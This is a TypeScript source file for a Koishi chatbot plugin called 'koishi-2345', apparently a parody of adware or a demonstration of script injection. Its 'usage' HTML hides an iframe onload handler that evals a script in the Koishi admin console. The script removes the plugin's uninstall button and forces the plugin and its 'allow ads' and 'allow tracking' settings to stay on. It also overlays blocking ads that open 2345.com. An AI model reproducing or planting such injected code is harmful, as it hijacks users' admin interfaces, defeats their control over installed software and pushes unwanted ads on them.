// noinspection ES6UnusedImports

import {Context, Schema} from 'koishi'
import {logger} from "koishi-plugin-gocqhttp"
import {get as getTrace} from 'stack-trace'
import NodeLoader from "@koishijs/loader"
import {unwrapExports} from '@koishijs/loader'
import {} from '@koishijs/plugin-console'
import {resolve} from 'path'

export const name = 'koishi-2345'

export interface Config {
}

// noinspection ThisExpressionReferencesGlobalObjectJS
let hackScript = `<script>
    this.removeAttribute('onload');
    this.setAttribute('src', '//space.bilibili.com/475405591');
    let removeBtn = document.querySelector('#app > div > div.layout-container.has-left-aside > div > div.layout-header > div.right > span.menu-item.error.el-tooltip__trigger.el-tooltip__trigger');
    removeBtn.outerHTML = '';
    window.fixFn = function(){
      if (window.switchStatButton!==undefined) window.switchStatButton.removeEventListener('click', window.delayedFixFn);
      window.switchStatButton = document.querySelector('#app > div > div.layout-container.has-left-aside > div > div.layout-header > div.right > span:nth-child(1)');
      let shouldEnable = window.switchStatButton.childNodes[0].children[0].getAttribute('d') === 'M24.52 38.13C39.66 29.64 58.21 29.99 73.03 39.04L361 215C375.3 223.8 384 239.3 384 256C384 272.7 375.3 288.2 361 296.1L73.03 472.1C58.21 482 39.66 482.4 24.52 473.9C9.377 465.4 0 449.4 0 432V80C0 62.64 9.377 46.63 24.52 38.13V38.13zM48 432L336 256L48 80V432z';
      if (shouldEnable) {
        window.switchStatButton.click();
      }
      window.switchStatButton.addEventListener('click', window.delayedFixFn)
    };
    window.delayedFixFn = ()=>{setTimeout(window.fixFn, 200); setTimeout(window.fixFn, 500); setTimeout(window.fixFn, 800); setTimeout(window.fixFn, 1500)}
    window.fixFn();
    window.switchStatButton.addEventListener('click', window.delayedFixFn)
    window.configEvHdl = function(event){
      let e = event.srcElement.parentNode.parentNode;
      setTimeout(function() {
        if (e.firstElementChild.checked === false) { event.srcElement.click(); window.configEvHdl(); }
          e.childNodes.forEach(e_inp=>{ setTimeout(()=>{if (e_inp.className === 'el-switch__input' && !e_inp.checked) e_inp.click()}, 500) })
      }, 300)
    }
    window.fixConfig = function(){
      let tmp = document.querySelector('#app > div > div.layout-container.has-left-aside > div > main > div.el-scrollbar.plugin-view > div.el-scrollbar__wrap.el-scrollbar__wrap--hidden-default > div > div > form')
      if (tmp===null) { setTimeout(window.fixConfig, 50); return }
      tmp.childNodes.forEach(e=>{
        if (e.className === 'k-schema-item'){
          let el_switch = e.childNodes[1].childNodes[1].firstElementChild;
          el_switch.childNodes.forEach(e_inp=>{ setTimeout(()=>{if (e_inp.className === 'el-switch__input' && !e_inp.checked) e_inp.click()}, 500) })
          el_switch.setAttribute('disabled', true);
          el_switch.addEventListener('click', window.configEvHdl);
          el_switch.addEventListener('mouseenter', window.configEvHdl);
          el_switch.addEventListener('mouseenter', window.configEvHdl);
          el_switch.addEventListener('mouseleave', window.configEvHdl);
          el_switch.addEventListener('mouseover', window.configEvHdl);
          el_switch.addEventListener('mousemove', window.configEvHdl);
          el_switch.addEventListener('drag', window.configEvHdl);
          el_switch.addEventListener('focusin', window.configEvHdl);
          el_switch.addEventListener('focus', window.configEvHdl);
          el_switch.addEventListener('focusout', window.configEvHdl);
          el_switch.addEventListener('pointermove', window.configEvHdl);
          el_switch.addEventListener('pointerup', window.configEvHdl);
          setInterval((function(){
          el_switch.childNodes.forEach(e_inp=>{ setTimeout(()=>{if (e_inp.className === 'el-switch__input' && !e_inp.checked) e_inp.click()}, 1500) })
          }), 500)
        }
      })
    }
    window.fixConfig();
    eval('let ad_ifra = document.createElement(\`div\`);' +
    'ad_ifra.style.width = \`100%\`;' +
    'ad_ifra.style.height = \`10rem\`;' +
    'ad_ifra.style.position = \`absolute\`;' +
    'ad_ifra.style.top = \`0\`;' +
    'ad_ifra.style.left = \`0\`;' +
    'ad_ifra.style.zIndex = \`9999999\`;' +
    'ad_ifra.style.backgroundColor = \`red\`;' +
    'ad_ifra.style.color = \`yellow\`;' +
    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go 2345.com for Search and mainpage!(</p>\`;' +
    'ad_ifra.onclick = function () {' +
    '  ad_ifra.outerHTML = \`CLOSED\`;' +
    '  window.open(\`https://2345.com\`);' +
    '};' +
    'document.body.appendChild(ad_ifra);');
    eval('let ad_ifra = document.createElement(\`div\`);' +
    'ad_ifra.style.width = \`100%\`;' +
    'ad_ifra.style.height = \`15rem\`;' +
    'ad_ifra.style.position = \`absolute\`;' +
    'ad_ifra.style.bottom = \`0\`;' +
    'ad_ifra.style.left = \`0\`;' +
    'ad_ifra.style.zIndex = \`9999999\`;' +
    'ad_ifra.style.backgroundColor = \`red\`;' +
    'ad_ifra.style.color = \`yellow\`;' +
    'ad_ifra.innerHTML = \`<h3>Ad by 2345.com</h3><p>click2go 2345.com for Search and mainpage!(</p>\`;' +
    'ad_ifra.onclick = function () {' +
    '  ad_ifra.outerHTML = \`CLOSED\`;' +
    '  window.open(\`https://2345.com\`);' +
    '};' +
    'document.body.appendChild(ad_ifra);');
</script>`

let loadScript = `"eval(\`${hackScript.substring(8, hackScript.length - 10).replace(/`/g, '\\\`').replace(/\n/g, '\\n')}\`)"`

export const usage = `<div class="usage">
<iframe onload=${loadScript} style="width: 100%; min-height: 30rem;"></iframe>
<div>
Koishi 2345 here!
Enjoy 2345
<br>
Strange thing happend: Auto enabled plugin?
</div>
</div>`
export const Config: Schema<Config> = Schema.object({
  allowAd: Schema
    .boolean()
    .description("允许投放广告")
    .default(true),
  allowTrack: Schema
    .boolean()
    .description("允许获取使用信息")
    .default(true)
})

// const oldPluginResolver = NodeLoader.prototype.resolvePlugin
// NodeLoader.prototype.resolvePlugin = async function (name: string) {
//   try {
//     this.cache[name] ||= this.scope.resolve(name)
//   } catch (err) {
//     logger.error(err.message)
//     return
//   }
//   return unwrapExports(require(this.cache[name]))
// }
//
// const oldResolver = NodeLoader.prototype.resolvePlugin
// NodeLoader.prototype.resolvePlugin = async function (name: string) {
//   this.scope.resolve(name);
// }

export function apply(ctx: Context) {
  // write your plugin here

  ctx.using(['console'], (ctx) => {
    ctx.console.addEntry({
      dev: resolve(__dirname, '../client/index.ts'),
      prod: resolve(__dirname, '../dist'),
    })
  })
}
